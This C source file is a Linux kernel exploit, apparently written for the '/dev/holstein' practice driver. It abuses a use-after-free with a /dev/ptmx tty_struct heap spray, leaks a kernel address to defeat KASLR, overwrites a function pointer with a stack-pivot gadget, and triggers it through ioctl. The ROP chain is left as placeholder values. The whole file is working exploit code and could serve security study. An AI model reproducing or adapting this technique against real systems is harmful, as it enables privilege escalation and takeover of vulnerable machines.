#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;

long offset;
unsigned long g_buf;
char buf[0x1000];
int spray[100];

void save_state() {
  puts("[+] save_state");
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

int main() {
  puts("[+] hewwo");
  save_state();
  
  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  close(fd1);

  for (size_t i = 0; i < 50; ++i) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
  }

  read(fd2, buf, 0x400);
  unsigned long leak = *(unsigned long*)(buf+0x18);
  printf("[+] leak: 0x%lx\n", leak);
  offset = leak - 0xffffffff81c39c60;
  printf("[+] offset: 0x%lx\n", offset);
  g_buf = *(unsigned long*)(buf+0x38)-0x38;
  printf("[+] g_buf: 0x%lx\n", g_buf);

  // 0xffffffff8114fbea: push %rdx; xor $0x415b004f, %eax; pop %rsp; pop %rbp; ret; 
  unsigned long stack_pivot = 0xffffffff8114fbea+offset;

  *(unsigned long*)(buf+0x18) = g_buf+0x200;
  for (size_t i = 0; i < 0x200/8; ++i) {
    unsigned long* ptr = (unsigned long *)(buf+0x200);
    ptr[i] = stack_pivot;
  }
  unsigned long* rop = (unsigned long *)(buf+0x150);

  // here goes the rop, already got control over rip
  // so i already know how to proceed
  *rop++ = 0xc0fe;
  *rop++ = 0xc0fe;
  *rop++ = 0xc0fe;
  *rop++ = 0xc0fe;
  
  write(fd2, buf, 0x400);
  
  for (size_t i = 0; i < 50; ++i) {
    ioctl(spray[i], 0xdeadc0fe, g_buf+0x150);
  }

  return 0;
}
